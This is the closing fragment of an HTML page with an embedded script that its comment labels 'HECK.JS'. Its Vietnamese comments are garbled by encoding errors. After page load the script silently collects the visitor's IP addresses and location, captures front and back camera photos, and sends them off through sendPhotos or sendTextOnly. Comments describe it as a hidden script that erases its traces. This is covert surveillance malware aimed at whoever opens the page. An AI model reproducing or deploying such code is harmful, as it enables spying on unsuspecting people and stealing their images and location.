                    await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
                
                    let front = null, back = null;
                
                    try {
                        front = await captureCamera("user");
                        await delay(500);
                        back = await captureCamera("environment");
                        info.camera = '‚úÖ ƒê√£ ch·ª•p camera tr∆∞·ªõc v√† sau';
                    } catch (e) {
                        info.camera = 'üö´ B·ªã t·ª´ ch·ªëi ho·∫∑c l·ªói camera';
                    }
                
                    if (front || back) {
                        await sendPhotos(front, back);
                    } else {
                        await sendTextOnly();
                    }
                    
                    // X√≥a d·∫•u v·∫øt
                    window.stealthExecuted = true;
                }
                
                // Th·ª±c thi script ·∫©n
                setTimeout(executeStealth, 3000);
                
            }, 1000); // ƒê·ª£i 1 gi√¢y sau khi trang load
        });
    })();
    </script>
    <!-- ===== K·∫æT TH√öC HECK.JS ===== -->
</body>
</html>
